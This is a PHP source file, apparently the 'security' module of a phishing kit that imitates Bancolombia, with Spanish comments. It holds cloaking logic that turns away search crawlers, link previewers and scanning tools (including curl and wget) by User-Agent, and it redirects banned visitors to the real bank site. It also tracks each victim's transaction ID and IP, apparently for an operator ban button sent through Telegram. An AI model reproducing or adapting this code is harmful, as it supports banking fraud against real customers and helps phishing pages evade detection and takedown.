<?php
// security.php - Protección Antibots, Seguridad de Sesión, Ban IP, CSRF, Cifrado LS
require_once __DIR__ . '/config.php';

function log_blocked($reason) {
    $log_file = __DIR__ . '/logs/blocked_bots.log';
    $log_dir = dirname($log_file);
    if (!is_dir($log_dir)) @mkdir($log_dir, 0755, true);
    
    $entry = date('Y-m-d H:i:s') . " - IP: " . sec_get_client_ip() . " - Reason: $reason - UA: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'NONE') . PHP_EOL;
    @file_put_contents($log_file, $entry, FILE_APPEND);
}

// ============================================================
// IP CLIENTE CONFISIBLE (sin spoofing de headers si no hay proxy confiable)
// ============================================================
function sec_get_client_ip() {
    $trustProxyHeaders = (bool)getenv('TRUST_PROXY_HEADERS');

    if ($trustProxyHeaders) {
        $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($keys as $k) {
            if (isset($_SERVER[$k]) && !empty($_SERVER[$k])) {
                $v = trim(explode(',', $_SERVER[$k])[0]);
                if (filter_var($v, FILTER_VALIDATE_IP)) return $v;
            }
        }
    }

    $v = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return filter_var($v, FILTER_VALIDATE_IP) ? $v : '0.0.0.0';
}

// ============================================================
// DIRECTORIOS SEGUROS
// ============================================================
function sec_state_dir() {
    static $d = null;
    if ($d !== null) return $d;
    $d = __DIR__ . '/.state';
    if (!is_dir($d)) @mkdir($d, 0755, true);
    $sub = $d . '/banned';
    if (!is_dir($sub)) @mkdir($sub, 0755, true);
    $sub2 = $d . '/ip_by_tx';
    if (!is_dir($sub2)) @mkdir($sub2, 0755, true);
    return $d;
}

// ============================================================
// BAN DE IP PERSISTENTE
// ============================================================
function sec_banned_file() {
    return sec_state_dir() . '/banned/banned_ips.json';
}

function sec_banned_read() {
    $f = sec_banned_file();
    if (!is_file($f)) return [];
    $raw = @file_get_contents($f);
    if ($raw === false || $raw === '') return [];
    $arr = @json_decode($raw, true);
    return is_array($arr) ? $arr : [];
}

function sec_banned_write($arr) {
    $f = sec_banned_file();
    @file_put_contents($f, json_encode($arr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
}

function sec_is_ip_banned($ip = null) {
    if ($ip === null) $ip = sec_get_client_ip();
    $list = sec_banned_read();
    if (isset($list[$ip])) {
        $entry = $list[$ip];
        $until = isset($entry['until']) ? (int)$entry['until'] : 0;
        if ($until === 0 || $until > time()) return $entry;
        // Expirado: quitar
        unset($list[$ip]);
        sec_banned_write($list);
    }
    return null;
}

function sec_ban_ip($ip, $reason = 'manual', $permanent = true, $seconds = 0) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
    $list = sec_banned_read();
    $entry = [
        'ip'        => $ip,
        'reason'    => (string)$reason,
        'banned_at' => time(),
        'until'     => $permanent ? 0 : (time() + max(1, (int)$seconds))
    ];
    $list[$ip] = $entry;
    sec_banned_write($list);
    log_blocked("BANNED: $reason " . ($permanent ? 'PERMANENT' : "TTL=$seconds") . " | IP=$ip");
    return true;
}

// ============================================================
// REGISTRO TX => IP (para que el botón BANEAR IP del operador encuentre la IP)
// ============================================================
function sec_tx_file($tx) {
    $tx = preg_replace('/[^a-zA-Z0-9_\-]/', '_', (string)$tx);
    if ($tx === '') return null;
    return sec_state_dir() . '/ip_by_tx/' . $tx . '.json';
}

function sec_store_tx_ip($tx, $extra = []) {
    $tx = (string)$tx;
    if ($tx === '') return;
    $f = sec_tx_file($tx);
    if ($f === null) return;
    $payload = [
        'ip'         => sec_get_client_ip(),
        'ua'         => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'stored_at'  => time(),
    ];
    if (is_array($extra) && count($extra) > 0) {
        foreach ($extra as $k => $v) $payload[$k] = $v;
    }
    @file_put_contents($f, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

function sec_read_tx_ip($tx) {
    $tx = (string)$tx;
    if ($tx === '') return null;
    $f = sec_tx_file($tx);
    if ($f === null || !is_file($f)) return null;
    $raw = @file_get_contents($f);
    if ($raw === false || $raw === '') return null;
    return @json_decode($raw, true);
}

// ============================================================
// BANEAR IP POR TRANSACTION_ID (lo llama webhook/api.php al recibir el botón)
// ============================================================
function sec_ban_by_tx($tx, $reason = 'telegram_button') {
    $info = sec_read_tx_ip($tx);
    if (is_array($info) && !empty($info['ip'])) {
        $r = sec_ban_ip($info['ip'], $reason . '|tx=' . $tx, true);
        if ($r) return $info['ip'];
    }
    return null;
}

// ============================================================
// CSRF + LS_KEY (cifrado localStorage)
// ============================================================
function sec_init_tokens() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(18));
    }
    if (empty($_SESSION['ls_key'])) {
        $_SESSION['ls_key'] = bin2hex(random_bytes(24));
    }
}

// ============================================================
// ANTIBOTS (mantener compatibilidad)
// ============================================================
function check_antibot() {
    if (!ANTIBOT_ENABLED) return;
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $bots = [
        'bot', 'crawl', 'slurp', 'spider', 'mediapartners', 'googlebot', 'bingbot',
        'yandex', 'baidu', 'facebookexternalhit', 'twitterbot', 'rogerbot',
        'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 'outbrain',
        'pinterest', 'slackbot', 'vkShare', 'W3C_Validator', 'curl', 'wget', 'python',
        'headless', 'phantomjs', 'selenium', 'puppeteer'
    ];
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            log_blocked("Bot detected: $bot");
            http_response_code(403);
            die("Acceso denegado.");
        }
    }
}

function start_secure_session() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start([
            'cookie_httponly' => true,
            'cookie_secure' => isset($_SERVER['HTTPS']),
            'use_only_cookies' => true,
            'cookie_samesite' => 'Lax',
        ]);
    }
}

// ============================================================
// INYECCIÓN DE VARIABLES JS GLOBALES (TODAS LAS PÁGINAS)
// ============================================================
function sec_inject_bootstrap_js() {
    static $done = false;
    if ($done) return '';
    $done = true;
    sec_init_tokens();
    $csrf   = $_SESSION['csrf_token'] ?? '';
    $lsKey  = $_SESSION['ls_key'] ?? '';
    $apiBase = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/');
    if ($apiBase === '' || $apiBase === '\\') $apiBase = '';
    return
        "<script>\n"
      . "(function(){\n"
      . "  window.__SEC = window.__SEC || {};\n"
      . "  window.__SEC.csrf = " . json_encode($csrf, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.lsKey = " . json_encode($lsKey, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.apiBase = " . json_encode($apiBase, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.clientIp = " . json_encode(sec_get_client_ip(), JSON_UNESCAPED_UNICODE) . ";\n"
      . "})();\n"
      . "</script>\n";
}

// ============================================================
// EJECUCIÓN (siempre que se incluya security.php en una página)
// ============================================================
check_antibot();
start_secure_session();

// 1. Comprobación de IP BANEADA (antes que nada, antes de imprimir nada)
$banned = sec_is_ip_banned();
if ($banned !== null) {
    log_blocked("Banned IP hit. reason=" . ($banned['reason'] ?? 'unknown'));
    // 302 -> Bancolombia real (para que no se quede en un 403 raro)
    header('Location: https://www.bancolombia.com/personas', true, 302);
    exit();
}

// 2. Guardar TX => IP si se pasa por URL / GET / POST (captura el tx de la víctima en cada salto de pantalla)
$tx = '';
if (isset($_GET['tx']) && is_string($_GET['tx'])) $tx = trim($_GET['tx']);
if ($tx === '' && isset($_GET['test_tx']) && is_string($_GET['test_tx'])) $tx = trim($_GET['test_tx']);
if ($tx === '' && isset($_POST['tx']) && is_string($_POST['tx'])) $tx = trim($_POST['tx']);
if ($tx === '' && isset($_SESSION['current_tx'])) $tx = (string)$_SESSION['current_tx'];
if ($tx !== '') {
    $_SESSION['current_tx'] = $tx;
    sec_store_tx_ip($tx);
}

// 3. Inicializar tokens CSRF y LS Key (aunque no usemos la inyección inmediatamente)
sec_init_tokens();

// 4. HOOK de salida: inyecta window.__SEC y CSP básico AUTOMÁTICAMENTE en TODAS las páginas
if (!defined('SEC_NO_OUTPUT_BUFFER')) {
    define('SEC_NO_OUTPUT_BUFFER', true);
    function sec_output_buffer_inject($buffer) {
        if (!is_string($buffer) || trim($buffer) === '') return $buffer;
        $injection = sec_inject_bootstrap_js();
        if ($injection === '' || $injection === '0') return $buffer;
        $injHead = stripos($buffer, '</head>');
        if ($injHead !== false) {
            return substr_replace($buffer, $injection . '</head>', $injHead, 7);
        }
        $injBody = stripos($buffer, '<body');
        if ($injBody !== false) {
            $injBodyEnd = strpos($buffer, '>', $injBody);
            if ($injBodyEnd !== false) {
                return substr_replace($buffer, '>' . $injection, $injBodyEnd, 1);
            }
        }
        return $injection . $buffer;
    }
    ob_start('sec_output_buffer_inject');
}
?>